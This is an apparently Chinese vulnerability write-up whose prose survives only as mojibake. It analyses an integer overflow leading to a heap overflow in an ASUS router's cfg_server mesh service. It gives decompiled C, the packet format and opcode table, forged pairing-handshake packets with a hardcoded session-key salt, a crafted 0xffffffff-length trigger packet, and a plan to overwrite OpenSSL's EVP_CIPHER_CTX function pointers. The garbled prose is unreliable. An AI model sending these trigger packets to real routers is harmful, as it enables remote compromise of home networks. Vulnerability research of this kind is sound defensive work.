<p><strong>åŸºæœ¬æ•°æ®å¤„ç†æµç¨‹</strong></p>
<p>ç”¨ IDA é€†å‘åˆ†ææ­¤ç¨‹åºï¼Œé€šè¿‡ recv å‡½æ•°äº¤å‰å¼•ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°åä¸º cm_tcpPacketHandler çš„å‡½æ•°ï¼Œè¯»å–æ•°æ®éƒ¨åˆ†:</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">memset</span>(v21, <span class="number">0</span>, <span class="number">0x4000</span>u);</span><br><span class="line">    v10 = read_tcp_message(v2, v21, <span class="number">0x4000</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &lt;= <span class="number">0</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( cm_packetProcess(v2, v21, v10, v19, v20, &amp;cm_ctrlBlock, v18) == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œè°ƒç”¨ read_tcp_message å‡½æ•°è¯»å–å¤–éƒ¨è¾“å…¥ï¼Œç„¶åè°ƒç”¨ cm_packetProcess å‡½æ•°å¤„ç†æ•°æ®ã€‚</p>
<p>cm_packetProcess é€»è¾‘è¾ƒå¤šï¼Œç®€å•æ¥è®²ï¼Œæ­¤å‡½æ•°å¸Œæœ›æ”¶åˆ°ç¬¦åˆ TLV æ ¼å¼çš„æ•°æ®ï¼Œæ‰€è°“ TLV å³ æ ‡è¯†åŸŸï¼ˆTagï¼‰+ é•¿åº¦åŸŸï¼ˆLengthï¼‰+ å€¼åŸŸï¼ˆValueï¼‰ï¼Œcfg_server å¯¹æ•°æ®æ ¼å¼å®šä¹‰æ¯”è¾ƒç®€å•ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              opcode               |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              data_len             |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              data_crc             |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |</span><br><span class="line">|               ...                 |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>ç¨‹åºä¼šæ ¹æ® opcode æ¥è°ƒç”¨ä¸åŒçš„ handler å‡½æ•°ï¼ŒTCP å’Œ UDP ç«¯å£åˆ†åˆ«å¯¹åº”ä¸€äº› handlerã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">TCP</span><br><span class="line">        1 cm_processREQ_KU</span><br><span class="line">        3 cm_processREQ_NC</span><br><span class="line">        5 cm_processREP_OK</span><br><span class="line">        8 cm_processREQ_CHK</span><br><span class="line">        0xA cm_processACK_CHK</span><br><span class="line">        0xF cm_processREQ_JOIN</span><br><span class="line">        0x12 cm_processREQ_RPT</span><br><span class="line">        0x14 cm_processREQ_GKEY</span><br><span class="line">        0x17 cm_processREQ_GREKEY</span><br><span class="line">        0x19 cm_processREQ_WEVENT</span><br><span class="line">        0x1B cm_processREQ_STALIST</span><br><span class="line">        0x1D cm_processREQ_FWSTAT</span><br><span class="line">        0x22 cm_processREQ_COST</span><br><span class="line">        0x24 cm_processREQ_CLIENTLIST</span><br><span class="line">        0x26 cm_processREQ_ONBOARDING</span><br><span class="line">        0x28 cm_processREQ_GROUPID</span><br><span class="line">        0x2A cm_processACK_GROUPID</span><br><span class="line">        0x2B cm_processREQ_SREKEY</span><br><span class="line">        0x2D cm_processREQ_TOPOLOGY</span><br><span class="line">        0x2F cm_processREQ_RADARDET</span><br><span class="line">        0x31 cm_processREQ_RELIST</span><br><span class="line">        0x33 cm_processREQ_APLIST</span><br><span class="line">        0x37 cm_processREQ_CHANGED_CONFIG</span><br><span class="line">        0x39 cm_processREQ_LEVEL</span><br><span class="line">UDP</span><br><span class="line">        1 cm_processREQ_STAMON</span><br><span class="line">        2 cm_processRSP_STAMON</span><br><span class="line">        3 cm_processREQ_ACL</span><br><span class="line">        4 cm_processREQ_STAFILTER</span><br><span class="line">        7 cm_processREQ_EXAPCHECK</span><br></pre></td></tr></table></figure></div>

<p>å¤„ç†æ•°æ®æ—¶ï¼Œå…ˆè·å– opcode å­—æ®µï¼Œæ ¹æ® opcode è°ƒç”¨ä¸åŒçš„å‡½æ•°ï¼Œå°† data_lenã€data_crcã€data ä½œä¸ºç¬¬ 4ã€5ã€7 ä¸ªå‚æ•°ä¼ å…¥ã€‚</p>
<p><strong>æ•´æ•°æº¢å‡º -&gt; å †æº¢å‡º</strong></p>
<p>ç›¸åŒçš„æ¼æ´ç‚¹ä½å¤šä¸ªå‡½æ•°ä¸­ï¼Œä»¥å…¶ä¸­ä¹‹ä¸€ä¸ºä¾‹ã€‚å½“ opcode &#x3D; 0x2a æ—¶ï¼Œç¨‹åºè°ƒç”¨ cm_processACK_GROUPID å‡½æ•°ï¼Œä»£ç ç‰‡æ®µ 1</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ( v10 )</span><br><span class="line">&#123;</span><br><span class="line">    v13 = bswap32(data_len);</span><br><span class="line">    <span class="keyword">if</span> ( v13 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( crc32(<span class="number">0</span>, data, v13) == bswap32(data_crc) )</span><br><span class="line">        &#123;</span><br><span class="line">            v18 = nvram_get_1(<span class="string">&quot;cfg_dbg&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v18, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">                cprintf(<span class="string">&quot;[%s(%d)]:OK\n&quot;</span>, <span class="string">&quot;cm_processACK_GROUPID&quot;</span>, <span class="number">8279</span>);</span><br><span class="line">            v19 = nvram_get_1(<span class="string">&quot;cfg_syslog&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v19, <span class="string">&quot;1&quot;</span>) )</span><br><span class="line">                asusdebuglog(<span class="number">6</span>, <span class="string">&quot;cfg_mnt.log&quot;</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;[%s(%d)]:OK\n&quot;</span>, <span class="string">&quot;cm_processACK_GROUPID&quot;</span>, <span class="number">8279</span>);</span><br><span class="line">            v20 = cm_aesDecryptMsg(v10, v10, data, v13);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ 4 è¡Œè½¬æ¢ data_len å­—èŠ‚åºï¼Œç¬¬ 7 è¡Œè°ƒç”¨ crc32 å‡½æ•°è®¡ç®— data éƒ¨åˆ†çš„ CRC å€¼ï¼Œè¦æ±‚å¾—åˆ°çš„å€¼å’Œ data_crc ç›¸åŒã€‚ç¬¬ 16 è¡Œè°ƒç”¨ cm_aesDecryptMsg å‡½æ•°å°è¯•è§£å¯†æ•°æ®ã€‚</p>
<p>ä»£ç ç‰‡æ®µ2</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">v10 = aes_decrypt(a1, data, data_len, v19);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>

<p>cm_aesDecryptMsg  å‡½æ•°ä¼šè°ƒç”¨ aes_decrypt å‡½æ•°ã€‚</p>
<p>ä»£ç ç‰‡æ®µ3</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">v17[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">CTX = EVP_CIPHER_CTX_new();</span><br><span class="line"><span class="keyword">if</span> ( !CTX )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_CIPHER_CTX_new() !!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">768</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">v9 = EVP_aes_256_ecb();</span><br><span class="line">v10 = EVP_DecryptInit_ex(CTX, v9, <span class="number">0</span>, key, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( v10 )</span><br><span class="line">&#123;</span><br><span class="line">    *a4 = <span class="number">0</span>;</span><br><span class="line">    v11 = EVP_CIPHER_CTX_block_size(CTX) + data_len;</span><br><span class="line">    v12 = <span class="built_in">malloc</span>(v11);</span><br><span class="line">    v10 = v12;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(v12, <span class="number">0</span>, v11);</span><br><span class="line">        v13 = v10;</span><br><span class="line">        <span class="keyword">for</span> ( i = data_len; ; i -= <span class="number">16</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            v15 = data + data_len - i;</span><br><span class="line">            <span class="keyword">if</span> ( i &lt;= <span class="number">0x10</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !EVP_DecryptUpdate(CTX, v13, v17, v15, <span class="number">16</span>) )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s(%d):Failed to EVP_DecryptUpdate()!!\n&quot;</span>, <span class="string">&quot;aes_decrypt&quot;</span>, <span class="number">795</span>);</span><br><span class="line">                EVP_CIPHER_CTX_free(CTX);</span><br><span class="line">                <span class="built_in">free</span>(v10);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            v13 += v17[<span class="number">0</span>];</span><br><span class="line">            *a4 += v17[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>æ­¤å‡½æ•°ä½¿ç”¨ openssl åº“ä¸­çš„ aes256 éƒ¨åˆ†ï¼Œå‰å‡ è¡Œåˆå§‹åŒ– EVP_CIPHER_CTX ç»“æ„ä½“ï¼Œç¬¬ 13 è¡Œå°† data_len å’Œ EVP_CIPHER_CTX_block_size(CTX) å€¼ç›¸åŠ ï¼Œè°ƒè¯•å¯çŸ¥è¿™é‡Œçš„ EVP_CIPHER_CTX_block_size(CTX) &#x3D; 0x10ã€‚</p>
<p>ç¬¬ 14 è¡Œé€šè¿‡ç›¸åŠ å¾—åˆ°çš„å€¼åˆ†é…å†…å­˜ç©ºé—´ï¼Œç¬¬ 25 è¡Œè°ƒç”¨ EVP_DecryptUpdate å‡½æ•°å¼€å§‹å¯¹æ•°æ®è¿›è¡Œå¾ªç¯è§£å¯†ï¼Œå¾ªç¯æ¬¡æ•°ç­‰äº data_lenã€‚</p>
<p>é—®é¢˜åœ¨äºï¼Œæ•´ä¸ªè§£å¯†æµç¨‹ä¸­ï¼Œç¨‹åºæ²¡æœ‰å¯¹ data_len(unsigned int) å˜é‡è¿›è¡Œæ ¡éªŒï¼Œå½“æˆ‘ä»¬ä¼ é€’ä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œä¾‹å¦‚ 0xffffffffï¼Œç¬¬ 13 è¡Œç›¸åŠ æ“ä½œäº§ç”Ÿæ•´æ•°æº¢å‡ºï¼Œv11 æ˜¯ unsigned int ç±»å‹ï¼Œæ•´æ•°æº¢å‡ºåå®ƒä¼šå˜æˆä¸€ä¸ªè¾ƒå°çš„å€¼ï¼Œå¯¼è‡´ malloc åˆ†é…å¾ˆå°çš„å†…å­˜ç©ºé—´ã€‚è€Œåç»­è§£å¯†æ•°æ®æ—¶å¾ªç¯æ¬¡æ•°ä½¿ç”¨äº† data_lenï¼Œå°†æ‹·è´è¿‡å¤šæ•°æ®åˆ°å †å†…å­˜ç©ºé—´ï¼Œé€ æˆå †æº¢å‡ºã€‚</p>
<h2 id="Mesh-é…å¯¹æµç¨‹åˆ†æ"><a href="#Mesh-é…å¯¹æµç¨‹åˆ†æ" class="headerlink" title="Mesh é…å¯¹æµç¨‹åˆ†æ"></a>Mesh é…å¯¹æµç¨‹åˆ†æ</h2><p>èƒ½å¤Ÿè§¦å‘å †æº¢å‡ºçš„é€”å¾„å¾ˆå¤šï¼Œæˆ‘ä»¬é€‰æ‹©å…¶ä¸­è¾ƒä¸ºå®Œæ•´çš„åˆ†æï¼Œå°è¯•ç†è§£ cfg_server é…å¯¹æµç¨‹ã€‚</p>
<p><strong>1. è¯·æ±‚å…¬é’¥</strong></p>
<p>å®¢æˆ·ç«¯æ”¶åˆ°é…å¯¹æ¶ˆæ¯ï¼Œæ„é€  opcode &#x3D; 1 çš„è¯·æ±‚ï¼Œcfg_server è°ƒç”¨ cm_processREQ_KU å‡½æ•°ï¼Œæ­¤å‡½æ•°ç›´æ¥è¿”å›ä¿å­˜åœ¨å†…å­˜ä¸­çš„ä¸€ä¸ª rsa_publickeyã€‚</p>
<p>ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 1            |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_len = 1           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_crc = 0           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |</span><br><span class="line">|              (\x00)               |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p><strong>2. äº¤æ¢å¯†é’¥</strong></p>
<p>å®¢æˆ·ç«¯æ”¶åˆ° public keyï¼Œæ„é€  opcode &#x3D; 3 çš„è¯·æ±‚ï¼Œcfg_server è°ƒç”¨ cm_processREQ_NC å‡½æ•°ï¼Œæ­¤å‡½æ•°å®ç°äº†ç®€å•çš„å¯†é’¥äº¤æ¢åŠŸèƒ½ã€‚</p>
<p>ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 3            |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              data_len             |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             data_crc              |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |------------------</span><br><span class="line">|                ...                |                 |</span><br><span class="line">+--------+--------+--------+--------+                 |</span><br><span class="line">                                                      |</span><br><span class="line">data:                                                 |</span><br><span class="line">0        8        16      24       32  (bit)          |</span><br><span class="line">+--------+--------+--------+--------+                 |</span><br><span class="line">|           banner1 = 0x1           | &lt;---------------|</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part1_data_len           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part1_data_crc           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           part1_data              |</span><br><span class="line">|                ...                |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           banner2 = 0x3           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part2_data_len           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|          part2_data_crc           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|           part2_data              |</span><br><span class="line">|                ...                |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>part1_data ä¸ºå®¢æˆ·ç«¯æŒ‡å®šçš„ä¸€ä¸ª AES256 å¯†é’¥ï¼Œpart2_data ä¸ºå®¢æˆ·ç«¯ nonce å€¼ã€‚</p>
<p>å®¢æˆ·ç«¯å°†ä»¥ä¸Šæ•°æ®åˆ©ç”¨ä¹‹å‰è¯·æ±‚å¾—åˆ°çš„å…¬é’¥è¿›è¡ŒåŠ å¯†ï¼Œç„¶åå‘é€åˆ°æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯æ”¶åˆ°è¯·æ±‚åè¿›è¡Œå¤šä¸ªæ ¡éªŒï¼Œå¦‚æœå…¨éƒ¨é€šè¿‡ï¼ŒæœåŠ¡ç«¯ä¼šæ„é€ å“åº”æŠ¥æ–‡</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|              rescode              |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            res_data_len           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            res_data_crc           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             res_data              |</span><br><span class="line">|            (encrypted)            |</span><br><span class="line">|                ...                |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>è¿”å›çš„æ•°æ®ä¸­ data éƒ¨åˆ†åˆ©ç”¨å®¢æˆ·ç«¯æä¾›çš„ AES å¯†é’¥è¿›è¡Œäº†åŠ å¯†ï¼Œå®¢æˆ·ç«¯è‡ªè¡Œè§£å¯†åå¾—åˆ°æ•°æ®</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             server_nonce          |</span><br><span class="line">|              len = 0x20           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            client_nonce           |</span><br><span class="line">|                 ...               |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>å…³é”®å†…å®¹æ˜¯ server_nonceã€‚</p>
<p><strong>3. æ¡æ‰‹</strong></p>
<p>å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡ç«¯è¿”å›çš„ server_nonce åï¼Œé€šè¿‡ä»¥ä¸‹ç®—æ³•å¾—åˆ°æ­¤æ¬¡ä¼šè¯çš„ session_key</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">sha256(&quot;A22AAC3EB69F9943ED8929D810A077A3&quot; + server_nonce + client_nonce)</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åå®¢æˆ·ç«¯æ„é€  opcode &#x3D; 5 çš„è¯·æ±‚ï¼Œcfg_server è°ƒç”¨ cm_processREP_OK å‡½æ•°ï¼ŒæœåŠ¡ç«¯æŒ‰ç…§ç›¸åŒçš„é€»è¾‘è®¡ç®—å‡º session_keyã€‚</p>
<p>ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚æ•°æ®:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 5            |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_len = 0           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|            data_crc = 0           |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               data                |</span><br><span class="line">|              (\x00)               |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>å¦‚æœæœåŠ¡ç«¯è¿”å› 0x6 å¼€å¤´çš„å“åº”ï¼Œè¯´æ˜æ¡æ‰‹æˆåŠŸï¼ŒæœåŠ¡ç«¯æŠŠä¼šè¯çš„ session_key æ”¾åˆ°ä¸€ä¸ªå…¨å±€å˜é‡ï¼šclientHashTable ä¸­ï¼Œåç»­åªè¦å®¢æˆ·ç«¯ä¸åˆ‡æ–­è¿æ¥ï¼Œå°±å¯ä»¥ç”¨è¿™ä¸ª session_key è°ƒç”¨æ›´å¤šåŠŸèƒ½ã€‚</p>
<p><strong>4. è§¦å‘æ¼æ´</strong></p>
<p>å®¢æˆ·ç«¯æ„é€  opcode &#x3D; 0xf çš„è¯·æ±‚ï¼Œcfg_server è°ƒç”¨ cm_processREQ_JOIN å‡½æ•°ï¼Œæ­¤å‡½æ•°å°è¯•å°†å…·æœ‰åˆæ³•ä¼šè¯çš„å®¢æˆ·ç«¯åŠ å…¥ mesh åˆ—è¡¨ã€‚</p>
<p>éƒ¨åˆ†ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line">session_key = cm_selectSessionKey(v13, <span class="number">1</span>);</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">v31 = cm_aesDecryptMsg(session_key, v21, tlv, v20);</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œå°±å›åˆ°å‰é¢çš„æ¼æ´åˆ†æéƒ¨åˆ†ï¼ŒAES è§£å¯†æ—¶ len ä½¿ç”¨ä¸å½“ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å¦‚ä¸‹è¯·æ±‚è§¦å‘æ¼æ´</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0        8        16      24       32  (bit)</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             opcode = 0xf          |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|       data_len = 0xffffffff       |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|             data_crc = 0          |</span><br><span class="line">+--------+--------+--------+--------+</span><br><span class="line">|               payload             |</span><br><span class="line">|           (&#x27;a&#x27; * 0x200)           |</span><br><span class="line">+--------+--------+--------+--------+</span><br></pre></td></tr></table></figure></div>

<p>ç”±äº data_len å¼‚å¸¸ï¼Œæ‰€ä»¥ crc æ ¡éªŒåªéœ€ä¼ å…¥ data_crc &#x3D; 0 å³å¯ç»•è¿‡ã€‚æ­¤å¤–ï¼Œpayload éƒ¨åˆ†åº”ä½¿ç”¨ session_key è¿›è¡Œ AES åŠ å¯†ã€‚</p>
<h2 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h2><p>æ­¤æ¼æ´æ˜¯å †æº¢å‡ºï¼ŒæŒ‰ç…§æ­£å¸¸æ€è·¯åº”è¯¥æ”¶é›†ç¨‹åºä¸­å¯èƒ½çš„ malloc å’Œ free æµç¨‹ï¼Œç„¶åé€šè¿‡å¦‚ fastbin_attack ç­‰æ‰‹æ®µå®Œæˆåˆ©ç”¨ï¼Œä½†ç»è¿‡è°ƒè¯•åˆ†æå‘ç°ï¼Œå½“å †å—å¸ƒå±€æ»¡è¶³ä¸€å®šæ¡ä»¶æ—¶ï¼Œopenssl åˆå§‹åŒ–çš„ EVP_CIPHER_CTX ç»“æ„ä½“å°†ä½äºå †æº¢å‡ºå†…å­˜ä¸‹æ–¹ï¼Œè¿™å°±æ„å‘³ç€å¯ä¿®æ”¹æ­¤ç»“æ„ä½“ä¸­çš„ä¸€äº›æˆå‘˜å˜é‡ã€‚</p>
<p>è¿™é‡Œæä¾›ä¸€ç§æ€è·¯ï¼ŒæŸ¥çœ‹ openssl <a class="link"   href="https://code.woboq.org/qt5/qtwebengine/src/3rdparty/chromium/third_party/boringssl/src/include/openssl/cipher.h.html#evp_cipher_ctx_st" >æºä»£ç <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>å¯ä»¥çœ‹åˆ° EVP_CIPHER_CTX çš„å…·ä½“å®šä¹‰</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_ctx_st</span> &#123;</span></span><br><span class="line">    <span class="comment">// cipher contains the underlying cipher for this context.</span></span><br><span class="line">    <span class="type">const</span> EVP_CIPHER *cipher;</span><br><span class="line">    <span class="comment">// app_data is a pointer to opaque, user data.</span></span><br><span class="line">    <span class="type">void</span> *app_data;      <span class="comment">// application stuff</span></span><br><span class="line">    <span class="comment">// cipher_data points to the |cipher| specific state.</span></span><br><span class="line">    <span class="type">void</span> *cipher_data;</span><br><span class="line">    <span class="comment">// key_len contains the length of the key, which may differ from</span></span><br><span class="line">    <span class="comment">// |cipher-&gt;key_len| if the cipher can take a variable key length.</span></span><br><span class="line">    <span class="type">unsigned</span> key_len;</span><br><span class="line">    <span class="comment">// encrypt is one if encrypting and zero if decrypting.</span></span><br><span class="line">    <span class="type">int</span> encrypt;</span><br><span class="line">    <span class="comment">// flags contains the OR of zero or more |EVP_CIPH_*| flags, above.</span></span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// oiv contains the original IV value.</span></span><br><span class="line">    <span class="type">uint8_t</span> oiv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="comment">// iv contains the current IV value, which may have been updated.</span></span><br><span class="line">    <span class="type">uint8_t</span> iv[EVP_MAX_IV_LENGTH];</span><br><span class="line">    <span class="comment">// buf contains a partial block which is used by, for example, CTR mode to</span></span><br><span class="line">    <span class="comment">// store unused keystream bytes.</span></span><br><span class="line">    <span class="type">uint8_t</span> buf[EVP_MAX_BLOCK_LENGTH];</span><br><span class="line">    <span class="comment">// buf_len contains the number of bytes of a partial block contained in</span></span><br><span class="line">    <span class="comment">// |buf|.</span></span><br><span class="line">    <span class="type">int</span> buf_len;</span><br><span class="line">    <span class="comment">// num contains the number of bytes of |iv| which are valid for modes that</span></span><br><span class="line">    <span class="comment">// manage partial blocks themselves.</span></span><br><span class="line">    <span class="type">unsigned</span> num;</span><br><span class="line">    <span class="comment">// final_used is non-zero if the |final| buffer contains plaintext.</span></span><br><span class="line">    <span class="type">int</span> final_used;</span><br><span class="line">    <span class="comment">// block_mask contains |cipher-&gt;block_size| minus one. (The block size</span></span><br><span class="line">    <span class="comment">// assumed to be a power of two.)</span></span><br><span class="line">    <span class="type">int</span> block_mask;</span><br><span class="line">    <span class="type">uint8_t</span> final[EVP_MAX_BLOCK_LENGTH];  <span class="comment">// possible final block</span></span><br><span class="line">&#125; <span class="comment">/* EVP_CIPHER_CTX */</span>;</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€ä¸ªæˆå‘˜ä¹Ÿæ˜¯ç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evp_cipher_st</span> &#123;</span></span><br><span class="line">    <span class="comment">// type contains a NID identifing the cipher. (e.g. NID_aes_128_gcm.)</span></span><br><span class="line">    <span class="type">int</span> nid;</span><br><span class="line">    <span class="comment">// block_size contains the block size, in bytes, of the cipher, or 1 for a</span></span><br><span class="line">    <span class="comment">// stream cipher.</span></span><br><span class="line">    <span class="type">unsigned</span> block_size;</span><br><span class="line">    <span class="comment">// key_len contains the key size, in bytes, for the cipher. If the cipher</span></span><br><span class="line">    <span class="comment">// takes a variable key size then this contains the default size.</span></span><br><span class="line">    <span class="type">unsigned</span> key_len;</span><br><span class="line">    <span class="comment">// iv_len contains the IV size, in bytes, or zero if inapplicable.</span></span><br><span class="line">    <span class="type">unsigned</span> iv_len;</span><br><span class="line">    <span class="comment">// ctx_size contains the size, in bytes, of the per-key context for this</span></span><br><span class="line">    <span class="comment">// cipher.</span></span><br><span class="line">    <span class="type">unsigned</span> ctx_size;</span><br><span class="line">    <span class="comment">// flags contains the OR of a number of flags. See |EVP_CIPH_*|.</span></span><br><span class="line">    <span class="type">uint32_t</span> flags;</span><br><span class="line">    <span class="comment">// app_data is a pointer to opaque, user data.</span></span><br><span class="line">    <span class="type">void</span> *app_data;</span><br><span class="line">    <span class="type">int</span> (*init)(EVP_CIPHER_CTX *ctx, <span class="type">const</span> <span class="type">uint8_t</span> *key, <span class="type">const</span> <span class="type">uint8_t</span> *iv,</span><br><span class="line">                <span class="type">int</span> enc);</span><br><span class="line">    <span class="type">int</span> (*cipher)(EVP_CIPHER_CTX *ctx, <span class="type">uint8_t</span> *out, <span class="type">const</span> <span class="type">uint8_t</span> *in,</span><br><span class="line">                  <span class="type">size_t</span> inl);</span><br><span class="line">    <span class="comment">// cleanup, if non-NULL, releases memory associated with the context. It is</span></span><br><span class="line">    <span class="comment">// called if |EVP_CTRL_INIT| succeeds. Note that |init| may not have been</span></span><br><span class="line">    <span class="comment">// called at this point.</span></span><br><span class="line">    <span class="type">void</span> (*cleanup)(EVP_CIPHER_CTX *);</span><br><span class="line">    <span class="type">int</span> (*ctrl)(EVP_CIPHER_CTX *, <span class="type">int</span> type, <span class="type">int</span> arg, <span class="type">void</span> *ptr);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

